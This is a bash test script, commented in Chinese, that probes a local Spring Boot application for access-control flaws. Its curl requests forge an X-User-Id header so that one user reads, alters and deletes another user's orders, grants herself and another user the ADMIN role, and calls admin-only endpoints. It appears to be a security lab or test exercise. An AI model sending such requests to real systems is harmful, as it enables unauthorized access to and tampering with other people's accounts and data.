#!/bin/bash

# SpringBoot 越权漏洞测试脚本
# 确保应用已启动在 http://localhost:8080

BASE_URL="http://localhost:8080"
ALICE_ID=2
BOB_ID=3
ADMIN_ID=1

echo "=========================================="
echo "SpringBoot 越权漏洞测试"
echo "=========================================="
echo ""

echo "【测试1】水平越权 - Alice 查看 Bob 的用户信息"
echo "请求: GET /api/users/3 (Alice ID=2 尝试查看 Bob ID=3)"
curl -s -H "X-User-Id: $ALICE_ID" "$BASE_URL/api/users/$BOB_ID" | jq '.' || echo "请求失败"
echo ""
echo "---"
echo ""

echo "【测试2】水平越权 - Alice 查看 Bob 的订单"
echo "请求: GET /api/orders/3 (Alice 尝试查看 Bob 的订单 order3)"
curl -s -H "X-User-Id: $ALICE_ID" "$BASE_URL/api/orders/3" | jq '.' || echo "请求失败"
echo ""
echo "---"
echo ""

echo "【测试3】水平越权 - Alice 修改 Bob 的订单"
echo "请求: PUT /api/orders/3 (Alice 尝试修改 Bob 的订单)"
curl -s -X PUT -H "X-User-Id: $ALICE_ID" -H "Content-Type: application/json" \
  -d '{"status":"CANCELLED","amount":0.01}' \
  "$BASE_URL/api/orders/3" | jq '.' || echo "请求失败"
echo ""
echo "---"
echo ""

echo "【测试4】水平越权 - Alice 删除 Bob 的订单"
echo "请求: DELETE /api/orders/4 (Alice 尝试删除 Bob 的订单 order4)"
curl -s -X DELETE -H "X-User-Id: $ALICE_ID" "$BASE_URL/api/orders/4" | jq '.' || echo "请求失败"
echo ""
echo "---"
echo ""

echo "【测试5】垂直越权 - Alice 将自己提升为管理员"
echo "请求: PUT /api/users/2/role?newRole=ADMIN"
curl -s -X PUT -H "X-User-Id: $ALICE_ID" \
  "$BASE_URL/api/users/$ALICE_ID/role?newRole=ADMIN" | jq '.' || echo "请求失败"
echo ""
echo "验证: 查看 Alice 的角色是否已变为 ADMIN"
curl -s -H "X-User-Id: $ALICE_ID" "$BASE_URL/api/users/$ALICE_ID" | jq '.role' || echo "请求失败"
echo ""
echo "---"
echo ""

echo "【测试6】垂直越权 - Alice 修改 Bob 的角色为管理员"
echo "请求: PUT /api/users/3/role?newRole=ADMIN"
curl -s -X PUT -H "X-User-Id: $ALICE_ID" \
  "$BASE_URL/api/users/$BOB_ID/role?newRole=ADMIN" | jq '.' || echo "请求失败"
echo ""
echo "---"
echo ""

echo "【测试7】垂直越权 - Alice 访问管理员功能（获取所有用户）"
echo "请求: GET /api/users/admin/all"
curl -s -H "X-User-Id: $ALICE_ID" "$BASE_URL/api/users/admin/all" | jq '.' || echo "请求失败"
echo ""
echo "---"
echo ""

echo "【测试8】垂直越权 - Alice 访问管理员统计功能"
echo "请求: GET /api/orders/admin/stats"
curl -s -H "X-User-Id: $ALICE_ID" "$BASE_URL/api/orders/admin/stats" | jq '.' || echo "请求失败"
echo ""
echo "=========================================="
echo "测试完成！"
echo "=========================================="

